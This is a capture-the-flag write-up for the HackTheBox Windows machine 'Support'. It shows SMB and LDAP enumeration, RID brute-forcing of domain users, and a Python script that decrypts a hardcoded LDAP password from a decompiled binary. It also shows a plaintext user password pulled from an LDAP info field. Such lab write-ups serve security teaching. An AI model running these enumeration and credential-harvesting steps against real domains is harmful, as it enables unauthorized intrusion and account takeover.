# CTF Penetration Testing

## Platform: HackTheBox

### Machine: [Support](https://www.hackthebox.com/machines/Support)

<img src="https://labs.hackthebox.com/storage/avatars/833a3b1f7f96b5708d19b6de084c3201.png" alt="Support Machine Logo" width="150"/>

- Machine type: <img src="https://hackmyvm.eu/img/windows.png" alt="Windows" width="17"/> Windows
- Machine difficulty: 🟩 Easy (<span style="color:#f4b03b;">4.7</span>)

> Support is an Easy difficulty Windows machine that features an SMB share that allows anonymous authentication. After connecting to the share, an executable file is discovered that is used to query the machine's LDAP server for available users. Through reverse engineering, network analysis or emulation, the password that the binary uses to bind the LDAP server is identified and can be used to make further LDAP queries. A user called `support` is identified in the users list, and the `info` field is found to contain his password, thus allowing for a WinRM connection to the machine. Once on the machine, domain information can be gathered through `SharpHound`, and `BloodHound` reveals that the `Shared Support Accounts` group that the `support` user is a member of, has `GenericAll` privileges on the Domain Controller. A Resource Based Constrained Delegation attack is performed, and a shell as `NT Authority\System` is received.

#### Skills Required

- Basic knowledge of Windows
- Basic knowledge of Active Directory
- Basic knowledge of LDAP

#### Skills Learned

- Connecting to an SMB share
- Quering an LDAP server for information
- Decompiling a .NET executable
- [Performing a Resource Based Constrained Delegation (RBCD) attack](https://blog.netwrix.com/2022/09/29/resource-based-constrained-delegation-abuse/)

#### Tools Used

Linux:
- bloodhound
- CyberChef
- ILspy
- impacket-ticketConverter
- impacket-wmiexec
- ldapsearch
- netexec
- nmap
- evil-winrm
- smbclient

Windows:
- Powermad.ps1
- PowerView.ps1
- Rubeus.exe
- SharpHound.exe

#### Machine Writeup

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`ifconfig tun0`:
```
tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.14.30 📌 netmask 255.255.254.0  destination 10.10.14.30
        inet6 dead:beef:2::101c  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::816:4b70:a099:fdbb  prefixlen 64  scopeid 0x20<link>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
        RX packets 160657  bytes 21519264 (20.5 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 163110  bytes 29889894 (28.5 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`fping 10.10.11.174`:
```
10.10.11.174 is alive
```

`sudo nmap -Pn -sSV -p- -T5 10.10.11.174`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-21 23:20 CET
Nmap scan report for 10.10.11.174
Host is up (0.18s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-21 22:31:41Z) 🔍
135/tcp   open  msrpc         Microsoft Windows RPC 🔍
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn 🔍
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name) 🔍
445/tcp   open  microsoft-ds? 🔍
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 🔍
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49679/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
49737/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 637.87 seconds
```

`sudo nmap -Pn -sS --script=ldap-rootdse -p389 10.10.11.174`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-21 23:21 CET
Nmap scan report for 10.10.11.174
Host is up (0.18s latency).

PORT    STATE SERVICE
389/tcp open  ldap
| ldap-rootdse: 
| LDAP Results
|   <ROOT>
|       domainFunctionality: 7
|       forestFunctionality: 7
|       domainControllerFunctionality: 7
|       rootDomainNamingContext: DC=support,DC=htb
|       ldapServiceName: support.htb:dc$@SUPPORT.HTB
|       isGlobalCatalogReady: TRUE
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       supportedLDAPPolicies: MaxPoolThreads
|       supportedLDAPPolicies: MaxPercentDirSyncRequests
|       supportedLDAPPolicies: MaxDatagramRecv
|       supportedLDAPPolicies: MaxReceiveBuffer
|       supportedLDAPPolicies: InitRecvTimeout
|       supportedLDAPPolicies: MaxConnections
|       supportedLDAPPolicies: MaxConnIdleTime
|       supportedLDAPPolicies: MaxPageSize
|       supportedLDAPPolicies: MaxBatchReturnMessages
|       supportedLDAPPolicies: MaxQueryDuration
|       supportedLDAPPolicies: MaxDirSyncDuration
|       supportedLDAPPolicies: MaxTempTableSize
|       supportedLDAPPolicies: MaxResultSetSize
|       supportedLDAPPolicies: MinResultSets
|       supportedLDAPPolicies: MaxResultSetsPerConn
|       supportedLDAPPolicies: MaxNotificationPerConn
|       supportedLDAPPolicies: MaxValRange
|       supportedLDAPPolicies: MaxValRangeTransitive
|       supportedLDAPPolicies: ThreadMemoryLimit
|       supportedLDAPPolicies: SystemMemoryLimitPercent
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.840.113556.1.4.801
|       supportedControl: 1.2.840.113556.1.4.473
|       supportedControl: 1.2.840.113556.1.4.528
|       supportedControl: 1.2.840.113556.1.4.417
|       supportedControl: 1.2.840.113556.1.4.619
|       supportedControl: 1.2.840.113556.1.4.841
|       supportedControl: 1.2.840.113556.1.4.529
|       supportedControl: 1.2.840.113556.1.4.805
|       supportedControl: 1.2.840.113556.1.4.521
|       supportedControl: 1.2.840.113556.1.4.970
|       supportedControl: 1.2.840.113556.1.4.1338
|       supportedControl: 1.2.840.113556.1.4.474
|       supportedControl: 1.2.840.113556.1.4.1339
|       supportedControl: 1.2.840.113556.1.4.1340
|       supportedControl: 1.2.840.113556.1.4.1413
|       supportedControl: 2.16.840.1.113730.3.4.9
|       supportedControl: 2.16.840.1.113730.3.4.10
|       supportedControl: 1.2.840.113556.1.4.1504
|       supportedControl: 1.2.840.113556.1.4.1852
|       supportedControl: 1.2.840.113556.1.4.802
|       supportedControl: 1.2.840.113556.1.4.1907
|       supportedControl: 1.2.840.113556.1.4.1948
|       supportedControl: 1.2.840.113556.1.4.1974
|       supportedControl: 1.2.840.113556.1.4.1341
|       supportedControl: 1.2.840.113556.1.4.2026
|       supportedControl: 1.2.840.113556.1.4.2064
|       supportedControl: 1.2.840.113556.1.4.2065
|       supportedControl: 1.2.840.113556.1.4.2066
|       supportedControl: 1.2.840.113556.1.4.2090
|       supportedControl: 1.2.840.113556.1.4.2205
|       supportedControl: 1.2.840.113556.1.4.2204
|       supportedControl: 1.2.840.113556.1.4.2206
|       supportedControl: 1.2.840.113556.1.4.2211
|       supportedControl: 1.2.840.113556.1.4.2239
|       supportedControl: 1.2.840.113556.1.4.2255
|       supportedControl: 1.2.840.113556.1.4.2256
|       supportedControl: 1.2.840.113556.1.4.2309
|       supportedControl: 1.2.840.113556.1.4.2330
|       supportedControl: 1.2.840.113556.1.4.2354
|       supportedCapabilities: 1.2.840.113556.1.4.800
|       supportedCapabilities: 1.2.840.113556.1.4.1670
|       supportedCapabilities: 1.2.840.113556.1.4.1791
|       supportedCapabilities: 1.2.840.113556.1.4.1935
|       supportedCapabilities: 1.2.840.113556.1.4.2080
|       supportedCapabilities: 1.2.840.113556.1.4.2237
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=support,DC=htb
|       serverName: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=support,DC=htb
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=support,DC=htb
|       namingContexts: DC=support,DC=htb
|       namingContexts: CN=Configuration,DC=support,DC=htb
|       namingContexts: CN=Schema,CN=Configuration,DC=support,DC=htb
|       namingContexts: DC=DomainDnsZones,DC=support,DC=htb
|       namingContexts: DC=ForestDnsZones,DC=support,DC=htb
|       isSynchronized: TRUE
|       highestCommittedUSN: 86102
|       dsServiceName: CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=support,DC=htb
|       dnsHostName: dc.support.htb 📌
|       defaultNamingContext: DC=support,DC=htb
|       currentTime: 20241121222240.0Z
|_      configurationNamingContext: CN=Configuration,DC=support,DC=htb
Service Info: Host: DC; OS: Windows

Nmap done: 1 IP address (1 host up) scanned in 1.72 seconds
```

`echo -e '10.10.11.174\tdc.support.htb dc support.htb' | sudo tee -a /etc/hosts`:
```
10.10.11.174    dc.support.htb dc support.htb
```

`netexec smb 10.10.11.174`:
```
SMB         10.10.11.174    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False) 📌
```

`netexec smb 10.10.11.174 -u '' -p ''`:
```
SMB         10.10.11.174    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.174    445    DC               [+] support.htb\: 
```

`netexec smb 10.10.11.174 -u '' -p '' --shares`:
```
SMB         10.10.11.174    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.174    445    DC               [+] support.htb\: 
SMB         10.10.11.174    445    DC               [-] Error enumerating shares: STATUS_ACCESS_DENIED              
```
❌

`netexec smb 10.10.11.174 -u '' -p '' --users`:
```                            
SMB         10.10.11.174    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.174    445    DC               [+] support.htb\: 
```
❌

`netexec smb 10.10.11.174 -u '' -p '' --rid-brute`:
```
SMB         10.10.11.174    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.174    445    DC               [+] support.htb\: 
SMB         10.10.11.174    445    DC               [-] Error connecting: LSAD SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
```
❌

`netexec smb 10.10.11.174 -u 'guest' -p ''`:
```
SMB         10.10.11.174    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.174    445    DC               [+] support.htb\guest: 
```

`netexec smb 10.10.11.174 -u 'guest' -p '' --shares`:
```
SMB         10.10.11.174    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.174    445    DC               [+] support.htb\guest: 
SMB         10.10.11.174    445    DC               [*] Enumerated shares
SMB         10.10.11.174    445    DC               Share           Permissions     Remark
SMB         10.10.11.174    445    DC               -----           -----------     ------
SMB         10.10.11.174    445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.174    445    DC               C$                              Default share
SMB         10.10.11.174    445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.174    445    DC               NETLOGON                        Logon server share 
SMB         10.10.11.174    445    DC               support-tools   READ            support staff tools 🔍
SMB         10.10.11.174    445    DC               SYSVOL                          Logon server share 
```

`netexec smb 10.10.11.174 -u 'guest' -p '' --users`:
```
SMB         10.10.11.174    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.174    445    DC               [+] support.htb\guest: 
```
❌

`netexec smb 10.10.11.174 -u 'guest' -p '' --rid-brute`:
```
SMB         10.10.11.174    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.174    445    DC               [+] support.htb\guest: 
SMB         10.10.11.174    445    DC               498: SUPPORT\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.174    445    DC               500: SUPPORT\Administrator (SidTypeUser)
SMB         10.10.11.174    445    DC               501: SUPPORT\Guest (SidTypeUser)
SMB         10.10.11.174    445    DC               502: SUPPORT\krbtgt (SidTypeUser)
SMB         10.10.11.174    445    DC               512: SUPPORT\Domain Admins (SidTypeGroup)
SMB         10.10.11.174    445    DC               513: SUPPORT\Domain Users (SidTypeGroup)
SMB         10.10.11.174    445    DC               514: SUPPORT\Domain Guests (SidTypeGroup)
SMB         10.10.11.174    445    DC               515: SUPPORT\Domain Computers (SidTypeGroup)
SMB         10.10.11.174    445    DC               516: SUPPORT\Domain Controllers (SidTypeGroup)
SMB         10.10.11.174    445    DC               517: SUPPORT\Cert Publishers (SidTypeAlias)
SMB         10.10.11.174    445    DC               518: SUPPORT\Schema Admins (SidTypeGroup)
SMB         10.10.11.174    445    DC               519: SUPPORT\Enterprise Admins (SidTypeGroup)
SMB         10.10.11.174    445    DC               520: SUPPORT\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.11.174    445    DC               521: SUPPORT\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.174    445    DC               522: SUPPORT\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.11.174    445    DC               525: SUPPORT\Protected Users (SidTypeGroup)
SMB         10.10.11.174    445    DC               526: SUPPORT\Key Admins (SidTypeGroup)
SMB         10.10.11.174    445    DC               527: SUPPORT\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.11.174    445    DC               553: SUPPORT\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.11.174    445    DC               571: SUPPORT\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.174    445    DC               572: SUPPORT\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.174    445    DC               1000: SUPPORT\DC$ (SidTypeUser)
SMB         10.10.11.174    445    DC               1101: SUPPORT\DnsAdmins (SidTypeAlias)
SMB         10.10.11.174    445    DC               1102: SUPPORT\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.174    445    DC               1103: SUPPORT\Shared Support Accounts (SidTypeGroup)
SMB         10.10.11.174    445    DC               1104: SUPPORT\ldap (SidTypeUser)
SMB         10.10.11.174    445    DC               1105: SUPPORT\support (SidTypeUser)
SMB         10.10.11.174    445    DC               1106: SUPPORT\smith.rosario (SidTypeUser)
SMB         10.10.11.174    445    DC               1107: SUPPORT\hernandez.stanley (SidTypeUser)
SMB         10.10.11.174    445    DC               1108: SUPPORT\wilson.shelby (SidTypeUser)
SMB         10.10.11.174    445    DC               1109: SUPPORT\anderson.damian (SidTypeUser)
SMB         10.10.11.174    445    DC               1110: SUPPORT\thomas.raphael (SidTypeUser)
SMB         10.10.11.174    445    DC               1111: SUPPORT\levine.leopoldo (SidTypeUser)
SMB         10.10.11.174    445    DC               1112: SUPPORT\raven.clifton (SidTypeUser)
SMB         10.10.11.174    445    DC               1113: SUPPORT\bardot.mary (SidTypeUser)
SMB         10.10.11.174    445    DC               1114: SUPPORT\cromwell.gerard (SidTypeUser)
SMB         10.10.11.174    445    DC               1115: SUPPORT\monroe.david (SidTypeUser)
SMB         10.10.11.174    445    DC               1116: SUPPORT\west.laura (SidTypeUser)
SMB         10.10.11.174    445    DC               1117: SUPPORT\langley.lucy (SidTypeUser)
SMB         10.10.11.174    445    DC               1118: SUPPORT\daughtler.mabel (SidTypeUser)
SMB         10.10.11.174    445    DC               1119: SUPPORT\stoll.rachelle (SidTypeUser)
SMB         10.10.11.174    445    DC               1120: SUPPORT\ford.victoria (SidTypeUser)
SMB         10.10.11.174    445    DC               2601: SUPPORT\MANAGEMENT$ (SidTypeUser)
```

`netexec smb 10.10.11.174 -u 'guest' -p '' --rid-brute | grep 'SidTypeUser' | awk '{ print $6 }' | awk -F '\' '{ print $2 }' | tee ./domain_users.txt`:
```
Administrator
Guest
krbtgt
DC$
ldap
support
smith.rosario
hernandez.stanley
wilson.shelby
anderson.damian
thomas.raphael
levine.leopoldo
raven.clifton
bardot.mary
cromwell.gerard
monroe.david
west.laura
langley.lucy
daughtler.mabel
stoll.rachelle
ford.victoria
MANAGEMENT$
```

`ldapsearch -x -H 'ldap://10.10.11.174' -D 'guest' -w '' -b 'dc=support,dc=htb'  '(objectClass=*)'`:
```
# extended LDIF
#
# LDAPv3
# base <dc=support,dc=htb> with scope subtree
# filter: (objectClass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5A, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4f7c

# numResponses: 1
```
❌

`smbclient -U 'guest' --password='' //10.10.11.174/support-tools`:
```
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Jul 20 19:01:06 2022
  ..                                  D        0  Sat May 28 13:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 13:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 13:19:55 2022
  putty.exe                           A  1273576  Sat May 28 13:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 13:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 19:01:07 2022 🔍
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 13:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 13:19:43 2022

                4026367 blocks of size 4096. 971507 blocks available
```

Indeed we are able to connect to the share as a guest and list the available files. The share contains a few application installers such as `putty` or `WireShark`, but one file stands out. Specifically `UserInfo.exe.zip` does not seem like a well known application. Let's download it locally and investigate further.

```
smb: \> get UserInfo.exe.zip 
getting file \UserInfo.exe.zip of size 277499 as UserInfo.exe.zip (59.1 KiloBytes/sec) (average 59.1 KiloBytes/sec)
```

`file ./UserInfo.exe.zip`:
```
./UserInfo.exe.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
```

After the archive has been downloaded, exit from the SMB share and unzip it.

`unzip ./UserInfo.exe.zip`:
```
Archive:  ./UserInfo.exe.zip
  inflating: UserInfo.exe 🔍
  inflating: CommandLineParser.dll   
  inflating: Microsoft.Bcl.AsyncInterfaces.dll  
  inflating: Microsoft.Extensions.DependencyInjection.Abstractions.dll  
  inflating: Microsoft.Extensions.DependencyInjection.dll  
  inflating: Microsoft.Extensions.Logging.Abstractions.dll  
  inflating: System.Buffers.dll      
  inflating: System.Memory.dll       
  inflating: System.Numerics.Vectors.dll  
  inflating: System.Runtime.CompilerServices.Unsafe.dll  
  inflating: System.Threading.Tasks.Extensions.dll  
  inflating: UserInfo.exe.config 
```

The archive contains quite a few DLL's as well as an executable file called `UserInfo.exe`.

`file ./UserInfo.exe`:
```
UserInfo.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
```

Checking the file type of `UserInfo.exe` shows that it is a .Net executable. As we are using a Linux system we have two ways to proceed. Decompiling the executable to see what it does or using `Wine` to attempt to run it.

**ILSpy**

In order to decompile the .Net executable we can use [`Avalonia ILspy`](https://github.com/icsharpcode/AvaloniaILSpy), which is a cross-platform version of [`ILSpy`](https://github.com/icsharpcode/ILSpy) that works on Linux.

`sudo ILSpy`

Let's now load the `UserInfo` executable in order to decompile it. Click on `File`, select `Open`, find the target binary in the file browser and select it.

After the binary has been imported, `ILSpy` will take care the decompilation and we will be able to view the source code. Taking a look at the code we quickly notice a function called `LdapQuery` under `UserInfo.Services` as well as two other functions called `FindUser` and `GetUser` under `UserInfo.Commands`.

`UserInfo (1.0.0)` > `UserInfo.Services` > `LdapQuery`:
```java
public LdapQuery()
	{
		string password = Protected.getPassword();
		entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password); 🔑
		entry.set_AuthenticationType((AuthenticationTypes)1);
		ds = new DirectorySearcher(entry);
	}
```

The code indicates that the binary is used to connect to a remote LDAP server and attempt to fetch user information.

The password to authenticate with the LDAP server is fetched from the `Protected.getPassword()` function.

`UserInfo (1.0.0)` > `UserInfo.Services` > `Protected`:
```java
internal class Protected
{
	private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";

	private static byte[] key = Encoding.ASCII.GetBytes("armando");

	public static string getPassword()
	{
		byte[] array = Convert.FromBase64String(enc_password);
		byte[] array2 = array;
		for (int i = 0; i < array.Length; i++)
		{
			array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
		}
		return Encoding.Default.GetString(array2);
	}
}
```

The password seems to be encrypted using XOR. The decryption process is as follows:
1. The `enc_password` string is Base64 decoded and placed into a byte array.
2. A second byte array called `array2` is created with the same value as `array`.
3. A loop is initialised, which loops through each character in `array` and XORs it with one letter of the key and then with the byte `0xDFu` (223).
4. Finally the decrypted key is returned.

Let's create a Python script that performs the decryption process.

`vim ./ldap_password_decrypt.py`:
```python
#!/usr/bin/env python3
import base64

def get_password():
    enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
    key = "armando".encode('ascii')

    # Decode the Base64 string
    array = base64.b64decode(enc_password)

    # Apply XOR with the key and the constant value 0xDF
    array2 = bytearray(len(array))
    for i in range(len(array)):
        array2[i] = (array[i] ^ key[i % len(key)]) ^ 0xDF

    # Convert the decoded bytes into a readable string
    return array2.decode('utf-8')

# Test the function
print(get_password())
```

`chmod u+x ./ldap_password_decrypt.py`

`./ldap_password_decrypt.py`:
```         
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz 🔑
```

<🔄 Alternative Step>

`firefox "https://cyberchef.org/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)XOR(%7B'option':'UTF8','string':'armando'%7D,'Standard',false)XOR(%7B'option':'Hex','string':'DF'%7D,'Standard',false)&input=ME52MzJQVHdnWWp6ZzkvOGo1VGJtdlBkM2U3V2h0V1d5dVBzeU83Ni9ZK1UxOTNF" &`

<img src=".\assets\screenshots\hackthebox_support_cyberchef_ldap_password_decrypt.png" alt="HackTheBox - Support | CyberChef LDAP password decrypt" width="700"/>

</🔄 Alternative Step>

The script prints out the decrypted password and we can proceed to connect to the LDAP server to gather information.

Having obtained the above credentials, let's connect to the LDAP server and see if we can find any interesting information.

`netexec smb 10.10.11.174 -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'`:
```
SMB         10.10.11.174    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.174    445    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

`netexec smb 10.10.11.174 -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --shares`:
```
SMB         10.10.11.174    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.174    445    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz 
SMB         10.10.11.174    445    DC               [*] Enumerated shares
SMB         10.10.11.174    445    DC               Share           Permissions     Remark
SMB         10.10.11.174    445    DC               -----           -----------     ------
SMB         10.10.11.174    445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.174    445    DC               C$                              Default share
SMB         10.10.11.174    445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.174    445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.11.174    445    DC               support-tools   READ            support staff tools
SMB         10.10.11.174    445    DC               SYSVOL          READ            Logon server share 🔍
```

`netexec winrm 10.10.11.174 -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'`:
```
WINRM       10.10.11.174    5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb)
WINRM       10.10.11.174    5985   DC               [-] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```
❌

To connect we can use the `ldapsearch` utility. Let's attempt to bind to the LDAP server using `ldap@support.htb` as the `BindDN` with the `-D` flag, and specifying `support` and `htb` as the `Domain Components` with the `-b` flag.

`ldapsearch -x -H 'ldap://10.10.11.174' -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'dc=support,dc=htb' '(objectClass=*)'`:
```
# extended LDIF
#
# LDAPv3
# base <dc=support,dc=htb> with scope subtree
# filter: (objectClass=*)
# requesting: ALL
#

# support.htb
dn: DC=support,DC=htb
objectClass: top
objectClass: domain
objectClass: domainDNS
distinguishedName: DC=support,DC=htb
instanceType: 5
whenCreated: 20220528110146.0Z
whenChanged: 20241121221640.0Z
subRefs: DC=ForestDnsZones,DC=support,DC=htb
subRefs: DC=DomainDnsZones,DC=support,DC=htb
subRefs: CN=Configuration,DC=support,DC=htb
uSNCreated: 4099
dSASignature:: AQAAACgAAAAAAAAAAAAAAAAAAAAAAAAA5VYBKcsiG0+bllUW2Ew2PA==
uSNChanged: 86045
name: support

[...]
```

When connecting to an LDAP server, the `BindDN` can be considered as a sort of username or account that we connect to and provides permissions to view and edit objects in the LDAP server.
The `Domain Components` on the other hand can be thought of as a directory structure in LDAP. They are read from right to left and instruct the server on where to look and which objects to fetch for us. In this case we instructed the server to go to the `htb` domain component, find the `support` domain component and then search for any objects.
The above command returns a large amount of data, which means the connection was successful.

Instead of `ldapsearch` we can also use the [`Apache Directory Studio` program](https://directory.apache.org/studio/). It provides a graphical interface, which can be used to more efficiently view LDAP data.

`ldapsearch -x -H 'ldap://10.10.11.174' -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'dc=support,dc=htb' '(objectClass=User)'`:
```
# extended LDIF
#
# LDAPv3
# base <dc=support,dc=htb> with scope subtree
# filter: (objectClass=User)
# requesting: ALL
#

# Administrator, Users, support.htb
dn: CN=Administrator,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Administrator
description: Built-in account for administering the computer/domain
distinguishedName: CN=Administrator,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528110156.0Z
whenChanged: 20241121221722.0Z
uSNCreated: 8196
memberOf: CN=Group Policy Creator Owners,CN=Users,DC=support,DC=htb
memberOf: CN=Domain Admins,CN=Users,DC=support,DC=htb
memberOf: CN=Enterprise Admins,CN=Users,DC=support,DC=htb
memberOf: CN=Schema Admins,CN=Users,DC=support,DC=htb
memberOf: CN=Administrators,CN=Builtin,DC=support,DC=htb
uSNChanged: 86053
name: Administrator
objectGUID:: ltGa4T+PO0uTHnjAEEcLlw==
userAccountControl: 512
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 133028750237139482
lastLogoff: 0
lastLogon: 133767010634001056
logonHours:: ////////////////////////////
pwdLastSet: 133027269567293588
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEIL9AEAAA==
adminCount: 1
accountExpires: 0
logonCount: 86
sAMAccountName: Administrator
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20220528111947.0Z
dSCorePropagationData: 20220528111947.0Z
dSCorePropagationData: 20220528110344.0Z
dSCorePropagationData: 16010101181216.0Z
lastLogonTimestamp: 133767010420875344

[...]

# support, Users, support.htb
dn: CN=support,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: support
c: US
l: Chapel Hill
st: NC
postalCode: 27514
distinguishedName: CN=support,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111200.0Z
whenChanged: 20220528111201.0Z
uSNCreated: 12617
info: Ironside47pleasure40Watchful 🔑
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb 📌
uSNChanged: 12630
company: support
streetAddress: Skipper Bowles Dr
name: support
objectGUID:: CqM5MfoxMEWepIBTs5an8Q==
userAccountControl: 66048
badPwdCount: 1
codePage: 0
countryCode: 0
badPasswordTime: 133767022145562948
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982099209777070
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILUQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: support 🔑

[...]
```

From the users list one seems to stand out, called `support`. Taking a look at this user's properties, we find a non default tag called `info` with a value of `Ironside47pleasure40Watchful`. This seems a lot like a password.
Further down we can also see that this user is a member of the `Remote Management Users` group, which allows them to connect over WinRM. To this end lets attempt to use `Evil-WinRM` to connect remotely to the `support` user with the identified password.

`netexec smb 10.10.11.174 -u 'support' -p 'Ironside47pleasure40Watchful'`:
```
SMB         10.10.11.174    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.174    445    DC               [+] support.htb\support:Ironside47pleasure40Watchful
```

